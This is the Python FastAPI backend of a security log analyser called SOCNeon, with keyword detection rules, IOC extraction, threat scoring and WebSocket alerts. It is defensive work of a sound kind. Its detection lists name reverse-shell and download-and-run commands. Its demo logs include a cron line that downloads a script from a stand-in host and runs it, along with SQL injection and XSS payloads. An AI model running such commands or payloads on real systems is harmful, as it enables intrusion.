"""
SOCNeon Backend — FastAPI + WebSockets
Real-time security log analysis API

Endpoints:
  POST /api/analyze          — Upload & analyze a log file
  POST /api/analyze/text     — Analyze pasted text
  GET  /api/demo/{fmt}       — Run demo data analysis
  WS   /ws/alerts            — WebSocket: stream live alerts
  GET  /api/health           — Health check
"""
import asyncio
import csv
import io
import json
import re
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, asdict
from datetime import datetime, timezone
from typing import Any, Optional
from fastapi import FastAPI, File, UploadFile, WebSocket, WebSocketDisconnect, Form, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse

app = FastAPI(title="SOCNeon API", version="2.1.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ─── WebSocket Manager ─────────────────────────────────────────────────────────
class ConnectionManager:
    def __init__(self):
        self.connections: dict[str, WebSocket] = {}

    async def connect(self, ws: WebSocket) -> str:
        await ws.accept()
        cid = str(uuid.uuid4())
        self.connections[cid] = ws
        return cid

    def disconnect(self, cid: str):
        self.connections.pop(cid, None)

    async def send(self, cid: str, data: dict):
        ws = self.connections.get(cid)
        if ws:
            try:
                await ws.send_json(data)
            except Exception:
                self.disconnect(cid)

    async def broadcast(self, data: dict):
        dead = []
        for cid, ws in self.connections.items():
            try:
                await ws.send_json(data)
            except Exception:
                dead.append(cid)
        for cid in dead:
            self.disconnect(cid)

manager = ConnectionManager()

# ─── Parser ────────────────────────────────────────────────────────────────────
def parse_logs(text: str, hint: Optional[str] = None) -> dict:
    text = text.strip()
    records = []
    errors = []
    fmt = hint

    # Auto-detect
    if not fmt:
        if text.startswith('[') or (text.startswith('{') and '\n' not in text[:50]):
            fmt = 'json'
        elif text.startswith('{') or (text[:1] == '{' and '\n' in text):
            fmt = 'jsonl'
        elif re.match(r'^\w[\w\s,]+\n', text[:200]):
            fmt = 'csv'
        else:
            fmt = 'syslog'

    if fmt == 'json':
        try:
            parsed = json.loads(text)
            items = parsed if isinstance(parsed, list) else [parsed]
            for i, item in enumerate(items):
                records.append({**item, '_raw': item, '_line': i + 1})
        except Exception as e:
            errors.append(str(e))

    elif fmt == 'jsonl':
        for i, line in enumerate(text.splitlines()):
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
                records.append({**obj, '_raw': obj, '_line': i + 1})
            except Exception as e:
                errors.append(f"Line {i+1}: {e}")

    elif fmt == 'csv':
        try:
            reader = csv.DictReader(io.StringIO(text))
            for i, row in enumerate(reader):
                d = dict(row)
                records.append({**d, '_raw': d, '_line': i + 1})
        except Exception as e:
            errors.append(str(e))

    else:  # syslog
        SYSLOG = re.compile(
            r'(?P<timestamp>\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})\s+'
            r'(?P<hostname>\S+)\s+(?P<program>\S+?)(?:\[(?P<pid>\d+)\])?:\s+'
            r'(?P<message>.+)'
        )
        for i, line in enumerate(text.splitlines()):
            line = line.strip()
            if not line:
                continue
            m = SYSLOG.match(line)
            if m:
                d = m.groupdict()
                d['_raw'] = {'raw': line}
                d['_line'] = i + 1
                records.append(d)
            else:
                records.append({'message': line, '_raw': {'raw': line}, '_line': i + 1})

    return {'records': records, 'format': fmt, 'total': len(records), 'errors': errors}

# ─── Detection Rules ───────────────────────────────────────────────────────────
@dataclass
class Finding:
    id: str
    ruleId: str
    title: str
    severity: str
    confidence: int
    category: str
    explanation: str
    evidence: dict
    event: dict
    timestamp: Optional[str] = None
    mitre: list = None
    isCustom: bool = False

    def __post_init__(self):
        if self.mitre is None:
            self.mitre = []

def _get(rec: dict, *keys: str, default='') -> str:
    for k in keys:
        v = rec.get(k, '')
        if v:
            return str(v).lower()
    return default

BRUTE_IPS: dict = defaultdict(list)
PRIV_ESC_IPS: dict = defaultdict(list)

RULES = [
    {
        'id': 'R001', 'title': 'Brute Force Login Attempt',
        'severity': 'high', 'confidence': 90,
        'category': 'Credential Access',
        'mitre': ['T1110'],
        'fn': lambda r: (
            ('fail' in _get(r, 'message', 'event_type', 'action') or
             'invalid' in _get(r, 'message') or
             'authentication failure' in _get(r, 'message')) and
            ('ssh' in _get(r, 'program', 'service', 'message') or
             'login' in _get(r, 'message') or
             'pam' in _get(r, 'program', 'message'))
        ),
        'explain': lambda r: f"Failed authentication detected from {r.get('src_ip', r.get('host', 'unknown'))} — brute-force pattern",
        'evidence': lambda r: {'src_ip': r.get('src_ip', r.get('host', '—')), 'program': r.get('program', '—')},
    },
    {
        'id': 'R002', 'title': 'Suspicious Port Scan Activity',
        'severity': 'medium', 'confidence': 75,
        'category': 'Discovery',
        'mitre': ['T1046'],
        'fn': lambda r: (
            'port scan' in _get(r, 'message') or
            'nmap' in _get(r, 'message') or
            r.get('dst_port') in ('0', '1', '7', '9', '13', '17', '19') or
            'scan' in _get(r, 'action', 'message')
        ),
        'explain': lambda r: f"Port scanning behavior from {r.get('src_ip', '?')} — possible reconnaissance",
        'evidence': lambda r: {'src_ip': r.get('src_ip', '—'), 'dst_port': r.get('dst_port', '—')},
    },
    {
        'id': 'R003', 'title': 'Privilege Escalation Attempt',
        'severity': 'critical', 'confidence': 85,
        'category': 'Privilege Escalation',
        'mitre': ['T1548'],
        'fn': lambda r: (
            'sudo' in _get(r, 'program', 'message') and
            ('not allowed' in _get(r, 'message') or
             'incorrect password' in _get(r, 'message') or
             'authentication failure' in _get(r, 'message'))
        ),
        'explain': lambda r: f"Sudo privilege escalation failure from user {r.get('user', '?')} — possible privesc attempt",
        'evidence': lambda r: {'user': r.get('user', r.get('username', '—')), 'program': r.get('program', '—')},
    },
    {
        'id': 'R004', 'title': 'Malware / Suspicious Process Execution',
        'severity': 'critical', 'confidence': 88,
        'category': 'Execution',
        'mitre': ['T1059'],
        'fn': lambda r: any(kw in _get(r, 'message', 'process', 'cmd') for kw in [
            'mimikatz', 'meterpreter', 'cobalt strike', 'powershell -enc',
            'base64', 'wget http', 'curl http', '/bin/bash -i', 'nc -e',
            'python -c', 'perl -e', 'ruby -e'
        ]),
        'explain': lambda r: "Suspicious process or command execution matching known malware/attack tool patterns",
        'evidence': lambda r: {'message': str(r.get('message', r.get('cmd', '—')))[:120]},
    },
    {
        'id': 'R005', 'title': 'Firewall Block — Repeated Denials',
        'severity': 'medium', 'confidence': 72,
        'category': 'Defense Evasion',
        'mitre': ['T1562'],
        'fn': lambda r: (
            r.get('action', '').lower() in ('blocked', 'deny', 'denied', 'reject', 'drop') or
            'block' in _get(r, 'message', 'action') or
            'deny' in _get(r, 'message', 'action')
        ),
        'explain': lambda r: f"Firewall blocked connection from {r.get('src_ip', '?')} → {r.get('dst_ip', '?')}:{r.get('dst_port', '?')}",
        'evidence': lambda r: {
            'src_ip': r.get('src_ip', '—'), 'dst_ip': r.get('dst_ip', '—'),
            'dst_port': r.get('dst_port', '—'), 'action': r.get('action', '—'),
        },
    },
    {
        'id': 'R006', 'title': 'Data Exfiltration — Large Outbound Transfer',
        'severity': 'high', 'confidence': 80,
        'category': 'Exfiltration',
        'mitre': ['T1041'],
        'fn': lambda r: (
            int(r.get('bytes_out', r.get('bytes_sent', 0)) or 0) > 10_000_000 or
            int(r.get('bytes', 0) or 0) > 10_000_000
        ),
        'explain': lambda r: f"Large outbound data transfer detected — {r.get('bytes_out', r.get('bytes', '?'))} bytes",
        'evidence': lambda r: {
            'bytes_out': r.get('bytes_out', r.get('bytes_sent', r.get('bytes', '—'))),
            'dst_ip': r.get('dst_ip', '—'),
        },
    },
    {
        'id': 'R007', 'title': 'SQL Injection Attempt',
        'severity': 'high', 'confidence': 83,
        'category': 'Initial Access',
        'mitre': ['T1190'],
        'fn': lambda r: any(kw in _get(r, 'message', 'url', 'uri', 'request') for kw in [
            "' or ", "1=1", "union select", "drop table", "insert into",
            "'; exec", "--", "xp_cmdshell", "0x", "char(", "waitfor delay"
        ]),
        'explain': lambda r: "SQL injection payload detected in request",
        'evidence': lambda r: {'url': str(r.get('url', r.get('uri', r.get('request', '—'))))[:120]},
    },
    {
        'id': 'R008', 'title': 'XSS Attempt Detected',
        'severity': 'medium', 'confidence': 76,
        'category': 'Initial Access',
        'mitre': ['T1059.007'],
        'fn': lambda r: any(kw in _get(r, 'message', 'url', 'uri', 'request') for kw in [
            '<script', 'javascript:', 'onerror=', 'onload=', 'alert(', 'document.cookie'
        ]),
        'explain': lambda r: "Cross-site scripting payload detected in web request",
        'evidence': lambda r: {'url': str(r.get('url', r.get('uri', '—')))[:120]},
    },
    {
        'id': 'R009', 'title': 'Unauthorized Admin Access',
        'severity': 'critical', 'confidence': 88,
        'category': 'Privilege Escalation',
        'mitre': ['T1078'],
        'fn': lambda r: (
            r.get('status_code') in ('403', 403) or
            (r.get('status_code') in ('401', 401) and
             any(p in _get(r, 'url', 'uri', 'path') for p in ['/admin', '/root', '/manage', '/api/admin']))
        ),
        'explain': lambda r: f"Unauthorized access attempt to admin endpoint: {r.get('url', r.get('uri', '?'))}",
        'evidence': lambda r: {
            'url': r.get('url', r.get('uri', '—')), 'status': r.get('status_code', '—'),
            'src_ip': r.get('src_ip', r.get('client_ip', '—')),
        },
    },
    {
        'id': 'R010', 'title': 'Rootkit / Kernel Module Tampering',
        'severity': 'critical', 'confidence': 90,
        'category': 'Defense Evasion',
        'mitre': ['T1014'],
        'fn': lambda r: any(kw in _get(r, 'message') for kw in [
            'insmod', 'rmmod', 'modprobe', 'kernel module', 'rootkit', '/proc/hidden'
        ]),
        'explain': lambda r: "Kernel module manipulation detected — possible rootkit activity",
        'evidence': lambda r: {'message': str(r.get('message', '—'))[:120]},
    },
    {
        'id': 'R011', 'title': 'Suspicious Cron / Scheduled Task',
        'severity': 'high', 'confidence': 78,
        'category': 'Persistence',
        'mitre': ['T1053'],
        'fn': lambda r: (
            'cron' in _get(r, 'program', 'message') and
            any(kw in _get(r, 'message') for kw in ['wget', 'curl', 'bash', 'python', 'perl', '/tmp/', '/dev/shm'])
        ),
        'explain': lambda r: "Suspicious scheduled task with download/execution capability — possible persistence mechanism",
        'evidence': lambda r: {'message': str(r.get('message', '—'))[:120]},
    },
    {
        'id': 'R012', 'title': 'C2 Beacon — Periodic Outbound Connections',
        'severity': 'critical', 'confidence': 82,
        'category': 'Command and Control',
        'mitre': ['T1071'],
        'fn': lambda r: (
            any(port == r.get('dst_port') for port in ['4444', '1337', '31337', '8888', '9999', '6666']) or
            any(kw in _get(r, 'message', 'url') for kw in ['beacon', '/gate.php', '/connect', 'heartbeat'])
        ),
        'explain': lambda r: f"Possible C2 beacon on port {r.get('dst_port', '?')} — known malware port",
        'evidence': lambda r: {
            'dst_ip': r.get('dst_ip', '—'), 'dst_port': r.get('dst_port', '—'),
        },
    },
]

def detect_all(records: list[dict]) -> list[Finding]:
    findings = []
    for rec in records:
        for rule in RULES:
            try:
                if rule['fn'](rec):
                    fid = f"{rule['id']}-{uuid.uuid4().hex[:8]}"
                    findings.append(Finding(
                        id=fid,
                        ruleId=rule['id'],
                        title=rule['title'],
                        severity=rule['severity'],
                        confidence=rule['confidence'],
                        category=rule['category'],
                        explanation=rule['explain'](rec),
                        evidence=rule['evidence'](rec),
                        event=rec,
                        timestamp=rec.get('timestamp', rec.get('@timestamp', '')),
                        mitre=rule.get('mitre', []),
                    ))
            except Exception:
                pass
    return findings

# ─── IOC Extraction ────────────────────────────────────────────────────────────
IP_RE = re.compile(r'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b')
DOMAIN_RE = re.compile(r'\b(?:[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?\.)+(?:com|net|org|io|ru|cn|xyz|onion|tk|cc)\b', re.I)
HASH_RE = re.compile(r'\b[0-9a-f]{32,64}\b', re.I)
URL_RE = re.compile(r'https?://\S+', re.I)

PRIVATE = re.compile(r'^(10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|127\.0\.0\.1|0\.0\.0\.0)')

def extract_iocs(records: list[dict]) -> dict:
    ips, domains, hashes, urls = set(), set(), set(), set()
    for r in records:
        text = json.dumps(r, default=str)
        for ip in IP_RE.findall(text):
            if not PRIVATE.match(ip):
                ips.add(ip)
        domains.update(DOMAIN_RE.findall(text))
        hashes.update(HASH_RE.findall(text))
        urls.update(URL_RE.findall(text))
    return {
        'ips': list(ips)[:200],
        'domains': list(domains)[:200],
        'hashes': list(hashes)[:100],
        'urls': list(urls)[:200],
    }

# ─── Threat Score ──────────────────────────────────────────────────────────────
SEV_WEIGHTS = {'critical': 25, 'high': 12, 'medium': 5, 'low': 2, 'info': 0}

def threat_score(findings: list[Finding]) -> dict:
    score = min(100, sum(SEV_WEIGHTS.get(f.severity, 0) for f in findings))
    level = 'CRITICAL' if score >= 70 else 'HIGH' if score >= 40 else 'MEDIUM' if score >= 20 else 'LOW'
    return {'score': score, 'level': level}

# ─── Correlations ──────────────────────────────────────────────────────────────
def correlate(findings: list[Finding]) -> list[dict]:
    by_ip: dict[str, list] = defaultdict(list)
    for f in findings:
        ip = f.evidence.get('src_ip') or f.event.get('src_ip', '')
        if ip and ip != '—':
            by_ip[ip].append(f)
    result = []
    for ip, flist in by_ip.items():
        if len(flist) > 1:
            tactics = list({f.category for f in flist})
            result.append({'ip': ip, 'count': len(flist), 'tactics': tactics})
    return result[:50]

# ─── Demo Data ────────────────────────────────────────────────────────────────
DEMO = {
    'syslog': """Sep 28 14:01:22 srv01 sshd[3821]: Failed password for root from 192.0.2.1 port 22 ssh2
Sep 28 14:01:24 srv01 sshd[3821]: Failed password for root from 192.0.2.1 port 22 ssh2
Sep 28 14:01:26 srv01 sshd[3821]: Failed password for root from 192.0.2.1 port 22 ssh2
Sep 28 14:01:28 srv01 sshd[3821]: Failed password for root from 192.0.2.1 port 22 ssh2
Sep 28 14:03:10 srv01 sudo[4001]: user1 : authentication failure ; TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
Sep 28 14:05:00 srv01 kernel: rootkit: module loading attempt detected /dev/hidden
Sep 28 14:06:15 srv01 cron[1234]: (root) CMD (wget http://evil.ru/shell.sh -O /tmp/s && bash /tmp/s)
Sep 28 14:08:44 fw01 kernel: iptables: deny src=10.0.0.5 dst=8.8.8.8 dport=4444""",
    'csv': """timestamp,src_ip,dst_ip,src_port,dst_port,action,bytes_out,message
2024-09-28T10:01:00Z,198.51.100.1,10.0.0.2,45231,22,blocked,0,SSH connection blocked
2024-09-28T10:02:00Z,198.51.100.1,10.0.0.2,45232,22,blocked,0,SSH connection blocked
2024-09-28T10:03:00Z,198.51.100.5,10.0.0.3,51234,443,allowed,15000000,HTTPS large upload
2024-09-28T10:04:00Z,198.51.100.9,10.0.0.4,33456,4444,allowed,0,C2 beacon port
2024-09-28T10:05:00Z,203.0.113.1,10.0.0.5,60001,80,allowed,500,Port scan probe""",
    'json': """[
  {"@timestamp":"2024-09-28T10:00:00Z","src_ip":"192.0.2.5","event_type":"authentication failure","message":"Failed password for admin from 192.0.2.5 ssh","service":"sshd"},
  {"@timestamp":"2024-09-28T10:00:05Z","url":"/admin/config","status_code":401,"client_ip":"203.0.113.10","method":"POST"},
  {"@timestamp":"2024-09-28T10:00:10Z","url":"/?id=1' OR 1=1--","status_code":200,"client_ip":"203.0.113.20","method":"GET"},
  {"@timestamp":"2024-09-28T10:00:15Z","message":"insmod rootkit.ko loaded","program":"kernel","hostname":"prod-srv1"},
  {"@timestamp":"2024-09-28T10:00:20Z","url":"/?q=<script>alert(1)</script>","status_code":200,"client_ip":"198.51.100.5"}
]""",
    'jsonl': """{"timestamp":"2024-09-28T09:00:00Z","src_ip":"203.0.113.1","dst_ip":"10.0.0.1","dst_port":"4444","action":"allowed","message":"outbound connection established"}
{"timestamp":"2024-09-28T09:01:00Z","message":"powershell -enc JABjAGwAaQBlAG4AdAA=","process":"powershell.exe","user":"SYSTEM"}
{"timestamp":"2024-09-28T09:02:00Z","message":"union select password from users","url":"/search","src_ip":"198.51.100.7"}
{"timestamp":"2024-09-28T09:03:00Z","dst_port":"31337","dst_ip":"185.0.0.1","action":"allowed","message":"beacon outbound"}""",
}

# ─── Core Analysis Pipeline ────────────────────────────────────────────────────
async def run_analysis_stream(
    text: str, hint: Optional[str], filename: str, ws_cid: Optional[str]
) -> dict:

    async def send(msg: dict):
        if ws_cid:
            await manager.send(ws_cid, msg)

    await send({'type': 'progress', 'msg': f'Parsing {filename}…', 'pct': 10})
    await asyncio.sleep(0.05)

    parsed = parse_logs(text, hint)
    records = parsed['records']
    await send({'type': 'progress', 'msg': f'Parsed {len(records):,} records', 'pct': 30})
    await asyncio.sleep(0.05)

    # Stream findings as they come
    findings = []
    for i, rec in enumerate(records):
        for rule in RULES:
            try:
                if rule['fn'](rec):
                    fid = f"{rule['id']}-{uuid.uuid4().hex[:8]}"
                    f = Finding(
                        id=fid, ruleId=rule['id'], title=rule['title'],
                        severity=rule['severity'], confidence=rule['confidence'],
                        category=rule['category'], explanation=rule['explain'](rec),
                        evidence=rule['evidence'](rec), event=rec,
                        timestamp=rec.get('timestamp', rec.get('@timestamp', '')),
                        mitre=rule.get('mitre', []),
                    )
                    findings.append(f)
                    await send({'type': 'alert', 'finding': asdict(f)})
            except Exception:
                pass
        if i % 50 == 0 and i > 0:
            pct = 30 + int(50 * i / max(len(records), 1))
            await send({'type': 'progress', 'msg': f'Analyzing record {i:,}/{len(records):,}…', 'pct': pct})
            await asyncio.sleep(0)

    await send({'type': 'progress', 'msg': 'Extracting IOCs…', 'pct': 85})
    iocs = extract_iocs(records)
    ts = threat_score(findings)
    correlations = correlate(findings)

    await send({'type': 'progress', 'msg': 'Complete!', 'pct': 100})

    result = {
        'filename': filename,
        'format': parsed['format'],
        'total': parsed['total'],
        'errors': len(parsed['errors']),
        'findings': [asdict(f) for f in findings],
        'iocs': iocs,
        'threatScore': ts,
        'correlations': correlations,
    }
    await send({'type': 'done', 'result': result})
    return result

# ─── REST Endpoints ────────────────────────────────────────────────────────────
@app.get('/api/health')
async def health():
    return {'status': 'ok', 'version': '2.1.0', 'connections': len(manager.connections)}

@app.post('/api/analyze')
async def analyze_file(
    file: UploadFile = File(...),
    ws_cid: Optional[str] = Form(None)
):
    content = await file.read()
    try:
        text = content.decode('utf-8')
    except UnicodeDecodeError:
        text = content.decode('latin-1')

    name = file.filename or 'upload'
    ext = name.rsplit('.', 1)[-1].lower()
    hint = {'csv': 'csv', 'json': 'json', 'jsonl': 'jsonl', 'ndjson': 'jsonl',
            'log': 'syslog', 'txt': 'syslog', 'syslog': 'syslog'}.get(ext)

    result = await run_analysis_stream(text, hint, name, ws_cid)
    return JSONResponse(result)

@app.post('/api/analyze/text')
async def analyze_text(payload: dict):
    text = payload.get('text', '')
    if not text.strip():
        raise HTTPException(400, 'Empty text')
    result = await run_analysis_stream(
        text, payload.get('hint'), payload.get('filename', 'pasted-text'),
        payload.get('ws_cid')
    )
    return JSONResponse(result)

@app.get('/api/demo/{fmt}')
async def demo(fmt: str, ws_cid: Optional[str] = None):
    text = DEMO.get(fmt)
    if not text:
        raise HTTPException(404, f'Unknown demo format: {fmt}')
    result = await run_analysis_stream(text, fmt if fmt != 'syslog' else None, f'demo-{fmt}', ws_cid)
    return JSONResponse(result)

# ─── WebSocket Endpoint ────────────────────────────────────────────────────────
@app.websocket('/ws/alerts')
async def ws_alerts(websocket: WebSocket):
    cid = await manager.connect(websocket)
    try:
        await manager.send(cid, {'type': 'connected', 'cid': cid})
        while True:
            # Keep connection alive, receive any client pings
            data = await websocket.receive_text()
            msg = json.loads(data)
            if msg.get('type') == 'ping':
                await manager.send(cid, {'type': 'pong', 'ts': time.time()})
    except WebSocketDisconnect:
        manager.disconnect(cid)
    except Exception:
        manager.disconnect(cid)

if __name__ == '__main__':
    import uvicorn
    uvicorn.run('main:app', host='0.0.0.0', port=8000, reload=True)
